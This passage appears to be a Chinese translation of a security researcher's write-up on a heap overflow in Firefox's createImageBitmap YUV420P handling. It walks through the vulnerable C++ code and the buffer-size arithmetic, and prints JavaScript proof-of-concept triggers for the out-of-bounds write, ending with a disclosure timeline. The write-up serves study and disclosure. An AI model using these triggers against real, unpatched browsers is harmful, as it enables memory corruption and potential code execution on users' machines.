        data.mCbCrSize = gfx::IntSize(uLayout.mWidth, uLayout.mHeight);
        data.mCbSkip = uLayout.mSkip;
        data.mCrSkip = vLayout.mSkip;
        // Picture rectangle.
        // We set the picture rectangle to exactly the size of the source image to
        // keep the full original data.
        data.mPicX = 0;
        data.mPicY = 0;
        data.mPicSize = data.mYSize;
        /* 2 */
        // Create a layers::Image and set data.
        if (aFormat == ImageBitmapFormat::YUV444P ||
            aFormat == ImageBitmapFormat::YUV422P ||
            aFormat == ImageBitmapFormat::YUV420P) {
          /* 3 */    
          RefPtr image = new layers::RecyclingPlanarYCbCrImage(new layers::BufferRecycleBin());
          ...
          /* 4 */
          // Set Data.
          if (NS_WARN_IF(!image->CopyData(data))) {
            return nullptr;
          }
          return image.forget();
        } else {
          ...
      }
正如我们所看到的，目前已经能够理清一些头绪了。
1、在这里，有几行代码用于将布局对象的数量提供给createImageBitmap函数。两个内联的布尔表达式根据aFormat参数来确定布局的顺序。我们现在需要3个布局对象：yLayout、uLayout和vLayout。需要注意一点，在第一步完成后，我们的aBufferData和布局对象上有许多操作，这些操作将我们的数据对象设置为从3个布局对象传递给CopyData。
2、这次检查只是为了确保我们提供了YUV420P格式。
3、创建图像对象，我们的数据将被复制到该对象。这一对象是RecyclingPlanarYCbCrImage，存储在父类型PlanarYCbCrImage的RefPtr中。需要注意的是，每一个RecyclingPlanarYCbCrImage都要使用新的BufferRecyleBin对象进行初始化。
4、最后，CopyData函数被恶意数据对象调用。
现在，触发器如下所示：
    try{
      //Represents the Cr.. elements
                    vLayout = {
                        offset: 0,
                        width: 4,
                        height: 1,
                        dataType: 'uint8',
                        stride: 1,
                        skip: 0,
                    };
      //represents our Y elements
                    yLayout = {
                            offset: 0,
                            //mData.mYSize:
                            width: 4, //mData.mYSize.width
                            height: 4, //mData.mYSize.height
                            dataType: 'uint8',
                            stride: 1, //mData.mYStride
                            skip: 1,
                        };
     //Represents the Cb.. elements
                    uLayout = {
                            offset: 0,
                            //mData.mCbCrSize:
                            width: 0, //mData.mCbCrSize.width
                            height: 1,  //mData.mCbCrSize.height
                            dataType: 'uint8',
                            stride: 4, //mData.mCbCrStride
                            skip: 1, 
                        };
      var aBuffer = new Uint8Array(0x100000);
      var aOffset = 0;
      var aLength = 0x1000;
      bitmap = createImageBitmap(aBuffer, aOffset, aLength, 'YUV420P', [yLayout, uLayout, vLayout]);
    } catch (ex) {
      console.log(ex);
    }
在代码中，我已经写了一些注释，来描述哪些JavaScript布局对象与CreateImageFromBufferSourceRawData中的变量相关。
这使得我们更容易确定我们控制的CopyData函数的哪些部分。
###  5.4 CopyData和CopyPlane
我们现在回到易受攻击的代码中。如前所述，这两个函数中存在2个漏洞：
1、基于高度和跨度来计算大小。
2、嵌套的for循环，其中内层for循环遍历了缓冲区的宽度，这是在第一步中没有考虑过的变量。
我们需要进行的最后一步，是制作我们的布局对象，以便溢出aDst缓冲区。这里，需要用到一点数学知识。
如果aDst缓冲区是根据以下公式计算的：
    size_t size = mData.mCbCrStride * mData.mCbCrSize.height * 2 + mData.mYStride * mData.mYSize.height;
并且，我们控制该公式中的4个部分，因此我们可以控制分配的aDst缓冲区的大小。
例如：
    mData.mCbCrStride = 1
    mData.mCbCrSize.height = 1
    mData.mYStride = 1
    mData.mYSize.height = 1024
    size_t size = mData.mCbCrStride * mData.mCbCrSize.height * 2 + mData.mYStride * mData.mYSize.height;
    size == 1026 bytes
因此，如果我们的aDst缓冲区长度为1026字节，我们所需要的只是让宽度>1026，就可以触发越界访问漏洞。
###  5.5 完成的触发器
现在，我们只需要将相关值，放入触发器中的JavaScript布局对象中：
    try{
      //Represents the Cr.. elements
                    vLayout = {
                        offset: 0,
                        width: 4,
                        height: 1,
                        dataType: 'uint8',
                        stride: 1,
                        skip: 0,
                    };
      //represents our Y elements
                    yLayout = {
                            offset: 0,
                            //mData.mYSize:
                            width: 1, //mData.mYSize.width
                            height: 1024, //mData.mYSize.height
                            dataType: 'uint8',
                            stride: 1, //mData.mYStride
                            skip: 1,
                        };
     //Represents the Cb.. elements
                    uLayout = {
                            offset: 0,
                            //mData.mCbCrSize:
                            width: 2048, //mData.mCbCrSize.width
                            height: 1,  //mData.mCbCrSize.height
                            dataType: 'uint8',
                            stride: 1, //mData.mCbCrStride
                            skip: 1, 
                        };
      var aBuffer = new Uint8Array(0x100000);
      var aOffset = 0;
      var aLength = 0x1000;
      bitmap = createImageBitmap(aBuffer, aOffset, aLength, 'YUV420P', [yLayout, uLayout, vLayout]);
    } catch (ex) {
      console.log(ex);
    }
并将其放入一些标签中，那么就大功告成了！
## 六、总结
至此，我们已经对漏洞进行了深入分析，并编写了触发器。接下来就是弹出calc计算器了，而我将这个步骤作为练习，留给各位读者尝试。这个过程确实充满挑战，但也会有成功后的快感。
从决定进行一些现实世界的攻击，到发现我的第一个漏洞，再到编写触发器，以及制作EXP，最后到Firefox修复这一漏洞，整个过程的体验可以说非常棒。从技术角度来说，Firefox是一头复杂的野兽，如果任何读者想要深入了解浏览器的工作原理，我觉得Firefox是不二之选。
如果对本文有任何意见或建议，请随时在Twitter上联系我，[@0x4a47](https://github.com/0x4a47 "@0x4a47")。
## 七、时间线
2018年1月8日 报告漏洞
2018年2月11日 漏洞已修复
2018年3月13日 Firefox在FF59安全通告中发布了该漏洞
2018年7月30日 Firefox公开漏洞详情